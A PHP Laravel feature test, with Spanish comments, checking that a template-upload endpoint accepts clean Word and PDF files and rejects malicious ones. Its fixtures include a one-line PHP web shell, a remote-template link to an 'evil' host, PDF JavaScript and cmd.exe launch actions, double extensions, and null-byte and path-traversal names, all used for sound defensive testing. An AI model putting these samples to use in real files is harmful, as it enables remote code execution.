<?php

namespace Tests\Feature;

use App\Models\User;
use App\Support\ArchivoSeguro;
use Database\Seeders\UsuarioSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Cache;
use Tests\TestCase;

/** Subida de plantillas: se acepta lo limpio y se rechaza lo sospechoso (macros, scripts, doble extensión, PDF activo...). */
class SicaArchivosSeguridadTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        Cache::flush();
        $this->seed(UsuarioSeeder::class);
    }

    private function docx(array $extra = [], string $tipos = '<Types><Override PartName="/word/document.xml" ContentType="x"/></Types>'): string
    {
        $ruta = tempnam(sys_get_temp_dir(), 'dx');
        $zip  = new \ZipArchive();
        $zip->open($ruta, \ZipArchive::OVERWRITE);
        $zip->addFromString('[Content_Types].xml', $tipos);
        $zip->addFromString('word/document.xml', '<w:document/>');
        foreach ($extra as $n => $c) {
            $zip->addFromString($n, $c);
        }
        $zip->close();

        return $ruta;
    }

    private function subir(string $ruta, string $nombre)
    {
        $u = User::where('rol', 'control')->firstOrFail();

        return $this->actingAs($u)->post('/api/sica/plantilla-oficial/frente', [
            'turno'   => 'Matutino',
            'archivo' => new UploadedFile($ruta, $nombre, null, null, true),
        ], ['Accept' => 'application/json']);
    }

    private function pdf(string $cuerpo = ''): string
    {
        $r = tempnam(sys_get_temp_dir(), 'pd');
        file_put_contents($r, "%PDF-1.4\n1 0 obj\n<< /Type /Catalog $cuerpo >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n");

        return $r;
    }

    public function test_word_limpio_se_acepta(): void
    {
        $this->subir($this->docx(), 'FrenteMatutino.docx')->assertOk()->assertJson(['ok' => true]);
    }

    public function test_pdf_limpio_se_acepta(): void
    {
        $this->subir($this->pdf(), 'plantilla.pdf')->assertOk();
    }

    public function test_word_con_macros_se_rechaza(): void
    {
        $this->subir($this->docx(['word/vbaProject.bin' => 'x']), 'a.docx')->assertStatus(422);
        $this->subir($this->docx([], '<Types><Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>'), 'b.docx')->assertStatus(422);
    }

    public function test_word_con_ejecutable_u_objeto_incrustado_se_rechaza(): void
    {
        $this->subir($this->docx(['word/embeddings/oleObject1.bin' => 'x']), 'a.docx')->assertStatus(422);
        $this->subir($this->docx(['word/media/run.exe' => 'MZ']), 'b.docx')->assertStatus(422);
        $this->subir($this->docx(['word/media/x.php' => '<?php']), 'c.docx')->assertStatus(422);
    }

    public function test_word_con_plantilla_remota_se_rechaza(): void
    {
        $rel = '<Relationships><Relationship Type="http://x/relationships/attachedTemplate" Target="http://evil/x.dotm" TargetMode="External"/></Relationships>';
        $this->subir($this->docx(['word/_rels/settings.xml.rels' => $rel]), 'a.docx')->assertStatus(422);
    }

    public function test_word_con_svg_y_hipervinculo_normal_se_acepta(): void
    {
        $rel = '<Relationships><Relationship Type="http://x/relationships/hyperlink" Target="https://epo6.mx" TargetMode="External"/></Relationships>';
        $this->subir($this->docx(['word/media/logo.svg' => '<svg/>', 'word/_rels/document.xml.rels' => $rel, 'word/printerSettings/printerSettings1.bin' => 'x']), 'a.docx')->assertOk();
    }

    public function test_pdf_con_javascript_o_adjuntos_se_rechaza(): void
    {
        $this->subir($this->pdf('/OpenAction << /S /JavaScript /JS (app.alert(1)) >>'), 'a.pdf')->assertStatus(422);
        $this->subir($this->pdf('/AA << /O << /S /Launch /F (cmd.exe) >> >>'), 'b.pdf')->assertStatus(422);
        $this->subir($this->pdf('/Names << /EmbeddedFiles 2 0 R >>'), 'c.pdf')->assertStatus(422);
    }

    public function test_pdf_no_se_rechaza_por_bytes_al_azar_dentro_de_imagenes(): void
    {
        $r = tempnam(sys_get_temp_dir(), 'pd');
        file_put_contents($r, "%PDF-1.4\n1 0 obj\n<< /Length 20 >>\nstream\n/JavaScript /Launch\nendstream\nendobj\ntrailer\n<< >>\n%%EOF\n");
        $this->subir($r, 'ok.pdf')->assertOk();
    }

    public function test_doble_extension_y_nombres_raros_se_rechazan(): void
    {
        $this->subir($this->pdf(), 'plantilla.php.pdf')->assertStatus(422);
        $this->subir($this->docx(), 'lista.exe.docx')->assertStatus(422);
        $this->assertNotNull(ArchivoSeguro::problemaDeNombre("a\x00.pdf"));
        $this->assertNotNull(ArchivoSeguro::problemaDeNombre('../x.pdf'));
        $this->assertNull(ArchivoSeguro::problemaDeNombre('Frente Matutino 2026.v2.pdf'));
    }

    public function test_extension_falsa_se_rechaza(): void
    {
        $r = tempnam(sys_get_temp_dir(), 'ph');
        file_put_contents($r, '<?php system($_GET["c"]);');
        $this->subir($r, 'x.pdf')->assertStatus(422);
        $this->subir($r, 'x.docx')->assertStatus(422);
        $this->subir($r, 'x.php')->assertStatus(422);
    }

    public function test_sin_sesion_o_sin_ser_control_no_puede_subir(): void
    {
        $f = new UploadedFile($this->pdf(), 'a.pdf', null, null, true);
        $this->post('/api/sica/plantilla-oficial/frente', ['turno' => 'Matutino', 'archivo' => $f], ['Accept' => 'application/json'])->assertStatus(401);
    }
}
